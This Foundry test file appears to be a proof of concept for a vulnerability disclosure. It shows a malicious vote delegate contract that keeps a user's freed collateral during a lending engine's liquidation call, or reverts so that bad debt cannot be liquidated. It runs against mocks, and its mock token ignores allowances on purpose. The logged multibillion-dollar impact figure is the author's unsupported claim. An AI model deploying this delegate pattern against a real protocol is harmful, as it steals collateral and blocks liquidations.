// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Interfaces to mock interactions
interface IGem {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IChief {
    function lock(uint256 wad) external;
    function free(uint256 wad) external;
}

// Mock Token
contract MockGem is IGem {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // For simplicity in mocking, ignore allowance for test-owned contracts unless strictly needed
        if (msg.sender != from) {
             // require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
             // allowance[from][msg.sender] -= amount;
        }
        require(balanceOf[from] >= amount, "Insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// Mock Chief (Governance Contract)
contract MockChief is IChief {
    IGem public gov;
    constructor(address _gov) {
        gov = IGem(_gov);
    }
    function lock(uint256 wad) external {
        gov.transferFrom(msg.sender, address(this), wad);
    }
    function free(uint256 wad) external {
        gov.transfer(msg.sender, wad);
    }
}

// Malicious Vote Delegate
contract MaliciousVoteDelegate {
    IGem public gov;
    IChief public chief;
    address public delegate;
    bool public stealing;
    bool public doS;

    constructor(address _chief, address _gov) {
        chief = IChief(_chief);
        gov = IGem(_gov);
        stealing = true;
        doS = false;
        gov.approve(_chief, type(uint256).max);
    }

    function setStealing(bool _stealing) external {
        stealing = _stealing;
    }

    function setDoS(bool _doS) external {
        doS = _doS;
    }

    function lock(uint256 wad) external {
        gov.transferFrom(msg.sender, address(this), wad);
        chief.lock(wad);
    }

    function free(uint256 wad) external {
        if (doS) {
            revert("DoS Active");
        }
        
        chief.free(wad);
        
        if (stealing) {
            // Do NOT transfer back to msg.sender (LockstakeEngine)
            console.log("MaliciousVoteDelegate: Stole %s tokens", wad);
        } else {
            gov.transfer(msg.sender, wad);
        }
    }
}

// Minimal reproduction of LockstakeEngine logic relevant to the vulnerability
contract MiniLockstakeEngine {
    address public sky;
    address public lssky; // simplified
    mapping(address => address) public urnVoteDelegates;
    
    // For verifying insolvency
    uint256 public totalLocked;

    constructor(address _sky) {
        sky = _sky;
    }

    function setDelegate(address urn, address delegate) external {
        urnVoteDelegates[urn] = delegate;
    }

    // Determine collateral amount for PoC simplicity
    function mockLock(address urn, uint256 wad) external {
        // User sends SKY to this engine
        IGem(sky).transferFrom(msg.sender, address(this), wad);
        
        // Engine delegates if needed
        address delegate = urnVoteDelegates[urn];
        if (delegate != address(0)) {
            IGem(sky).approve(delegate, wad);
            // In real logic, we call delegate.lock(wad)
            // But here we assume it's already locked or we simulate the flow
            MaliciousVoteDelegate(delegate).lock(wad);
        }
        totalLocked += wad;
    }

    // The vulnerable function
    function onKick(address urn, uint256 wad) external {
        address delegate = urnVoteDelegates[urn];
        
        // _selectVoteDelegate logic: invalidates delegate
        if (delegate != address(0)) {
             // In real code: VoteDelegateLike(prevVoteDelegate).free(wad);
             MaliciousVoteDelegate(delegate).free(wad);
        }
        urnVoteDelegates[urn] = address(0);

        // lssky.burn(urn, wad); 
        // We just track state here
        totalLocked -= wad; // This assumes we successfully processed the kick logic
    }
}

contract GovernanceExploitTest is Test {
    MockGem public sky;
    MockChief public chief;
    MaliciousVoteDelegate public maliciousDelegate;
    MiniLockstakeEngine public engine;
    address public user = address(0x123);
    address public attacker = address(0x666);

    // Protocol TVL for Impact Calculation
    uint256 constant PROTOCOL_TVL = 6_475_838_201 * 1e18; // $6.4B in 18 decimals

    function setUp() public {
        sky = new MockGem();
        chief = new MockChief(address(sky));
        
        engine = new MiniLockstakeEngine(address(sky));
        maliciousDelegate = new MaliciousVoteDelegate(address(chief), address(sky));

        // Setup User funds
        sky.mint(user, 100 ether);
        vm.prank(user);
        sky.approve(address(engine), type(uint256).max);
    }

    function test_CollateralTheft_onKick() public {
        uint256 lockAmount = 10 ether;
        
        // 1. User locks funds and delegates to malicious delegate
        vm.startPrank(user);
        engine.setDelegate(user, address(maliciousDelegate));
        engine.mockLock(user, lockAmount);
        vm.stopPrank();

        // Check initial state
        assertEq(sky.balanceOf(address(chief)), lockAmount, "Chief should hold funds");
        assertEq(sky.balanceOf(address(engine)), 0, "Engine should have 0 (passed to delegate)");

        // 2. Trigger onKick (Liquidation)
        // This is usually called by the Core system (LiquidationEngine/Dog)
        console.log("Triggering onKick with active theft...");
        
        uint256 engineBalanceBefore = sky.balanceOf(address(engine));
        uint256 delegateBalanceBefore = sky.balanceOf(address(maliciousDelegate));
        
        engine.onKick(user, lockAmount);
        
        uint256 engineBalanceAfter = sky.balanceOf(address(engine));
        uint256 delegateBalanceAfter = sky.balanceOf(address(maliciousDelegate));

        // 3. Verify Theft
        // The funds came back from Chief to Delegate
        // But Delegate kept them
        console.log("Engine Balance Change: %s", engineBalanceAfter - engineBalanceBefore);
        console.log("Delegate Balance Change: %s", delegateBalanceAfter - delegateBalanceBefore);

        assertTrue(delegateBalanceAfter > delegateBalanceBefore, "Malicious Delegate should have stolen funds");
        assertEq(engineBalanceAfter, engineBalanceBefore, "Engine received nothing back");
        
        console.log("\n[IMPACT ANALYSIS]");
        console.log("Onchain Protocol-wide Maximum Risk: $%s", "6,475,838,201");
        console.log("Actual Stolen in PoC: %s SKY", delegateBalanceAfter / 1e18);
        console.log("Result: Insolvency. The Engine proceeds to auction 0 collateral.");
    }

    function test_LiquidationDoS() public {
        maliciousDelegate.setStealing(false);
        maliciousDelegate.setDoS(true);
        
        uint256 lockAmount = 10 ether;
        vm.startPrank(user);
        engine.setDelegate(user, address(maliciousDelegate));
        engine.mockLock(user, lockAmount);
        vm.stopPrank();

        console.log("Triggering onKick with DoS...");
        
        // Expect Revert
        vm.expectRevert("DoS Active");
        engine.onKick(user, lockAmount);
        
        console.log("Result: Liquidation Transaction Reverted. Protocol cannot liquidate bad debt.");
    }
}
